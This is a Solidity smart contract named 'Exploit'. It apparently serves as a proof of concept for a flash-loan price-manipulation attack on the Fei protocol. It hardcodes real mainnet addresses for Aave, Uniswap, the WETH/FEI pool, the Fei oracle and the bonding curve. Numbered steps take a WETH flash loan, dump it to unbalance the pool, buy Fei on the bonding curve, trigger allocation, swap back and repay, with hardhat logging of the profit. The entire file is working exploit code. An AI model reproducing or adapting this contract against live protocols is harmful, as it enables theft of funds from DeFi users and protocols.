pragma solidity ^0.6.0;
pragma experimental ABIEncoderV2;

import "./IERC20.sol";
import "./IWETH.sol";
import "./IUniswapV2Pair.sol";
import "./IUniswapV2Router02.sol";
import "./IUpdateableOracle.sol";
import "./IAaveLendingPool.sol";
import "./IFlashLoanReceiver.sol";
import "./IBondingCurve.sol";
import "./Decimal.sol";
import "./Allocator.sol";

import "hardhat/console.sol";

contract Exploit is IFlashLoanReceiver {

    IWETH private immutable WETH = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IERC20 private immutable FEI = IERC20(0x956F47F50A910163D8BF957Cf5846D573E7f87CA);

    IAaveLendingPool private immutable AAVE_LENDING_POOL = IAaveLendingPool(0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9);
    address public immutable ADDRESSES_PROVIDER = 0xB53C1a33016B2DC2fF3653530bfF1848a515c8c5;
    address public immutable LENDING_POOL = 0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9;

    IUniswapV2Router02 private immutable ROUTER_02 = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    IUniswapV2Pair private immutable WETH_FEI_POOL = IUniswapV2Pair(0x94B0A3d511b6EcDb17eBF877278Ab030acb0A878);

    IUpdateableOracle private immutable UNISWAP_ORACLE = IUpdateableOracle(0x087F35bd241e41Fc28E43f0E8C58d283DD55bD65);
    IBondingCurve private immutable ETH_BONDING_CURVE = IBondingCurve(0xe1578B4a32Eaefcd563a9E6d0dc02a4213f673B7);

    uint private _aavePremium;
    uint private _d;
    uint private _b;

    function start(uint d, uint b) external {

        _d = d;
        _b = b;

        UNISWAP_ORACLE.update();
        console.log("Updated oracle");

        // 1. Get WETH flashloan from Aave
        address[] memory assets = new address[](1);
        assets[0] = address(WETH);
        uint[] memory amounts = new uint[](1);
        amounts[0] = d + b;
        uint[] memory modes = new uint[](1);
        modes[0] = 0;
        AAVE_LENDING_POOL.flashLoan(address(this), assets, amounts, modes, address(0), "", 0);

        // END - After Aave .flashLoan returns

        console.log("");
        console.log("##################################");
        console.log("ETH balance", WETH.balanceOf(address(this)), WETH.balanceOf(address(this)) / 10**18);
    }

    function dump() internal {
        // 2. Inbalance pool: dump ETH
        WETH.approve(address(ROUTER_02), _d);
        address[] memory path = new address[](2);
        path[0] = address(WETH);
        path[1] = address(FEI);
        ROUTER_02.swapExactTokensForTokens(_d, 1, path, address(this), uint(-1));
        console.log("Dumped", _d / 10**18, "ETH on WETH/FEI pool");

        buyFromBondingCurve();
    }

    function buyFromBondingCurve() internal { 
        // 3. Buy Fei on bonding curve
        WETH.withdraw(_b);
        ETH_BONDING_CURVE.purchase{value: _b}(address(this), _b);
        console.log("Bought Fei from bonding curve for", _b / 10**18, "ETH");

        allocate();
    }

    function allocate() internal {
        // 4. Allocate ETH from bonding curve purchase
        new Allocator(ETH_BONDING_CURVE);
        console.log("Allocated ETH from Fei protocol");

        buyback();
    }

    function buyback() internal {
        // 5. Buy WETH from WETH/FEI pool
        uint remainingBalance = FEI.balanceOf(address(this));
        FEI.approve(address(ROUTER_02), remainingBalance);
        address[] memory path = new address[](2);
        path[0] = address(FEI);
        path[1] = address(WETH);
        ROUTER_02.swapExactTokensForTokens(remainingBalance, 1, path, address(this), uint(-1));
        console.log("Swapped", remainingBalance / 10**18, "Fei on WETH/FEI pool");
        
        repayETH();
    }

    function repayETH() internal {
        // 6. Approve Aave for flashloan payback
        WETH.approve(address(AAVE_LENDING_POOL), _d + _b + _aavePremium);
    }

    function executeOperation(address[] calldata assets, uint256[] calldata amounts, uint256[] calldata premiums, address initiator, bytes calldata params) external override returns (bool) {
        _aavePremium = premiums[0];
        console.log("Received WETH flashloan with premium", _aavePremium / 10**18);
        dump();
        console.log("Repaying ETH flashloan");
        return true;
    }

    receive() external payable {}
}
